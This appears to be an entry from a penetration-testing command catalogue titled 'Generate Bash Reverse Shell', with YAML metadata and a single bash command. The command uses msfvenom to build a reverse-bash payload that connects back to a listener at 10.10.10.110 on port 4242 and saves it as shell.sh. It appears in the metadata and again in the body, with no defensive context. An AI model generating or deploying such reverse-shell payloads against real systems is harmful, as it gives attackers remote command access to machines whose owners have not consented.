---
id: 3aaf8c80-3f61-4436-9b07-3165b0f62f4f
name: Generate Bash Reverse Shell
type: command
executor: bash
data: $ msfvenom -p cmd/unix/reverse_bash LHOST="10.10.10.110" LPORT=4242 -f raw >
  shell.sh
output: null
created_at: '2023-04-06T03:56:21.275674+00:00'
updated_at: '2023-04-10T20:25:02.586400+00:00'
---

# Generate Bash Reverse Shell

```bash
$ msfvenom -p cmd/unix/reverse_bash LHOST="10.10.10.110" LPORT=4242 -f raw > shell.sh
```
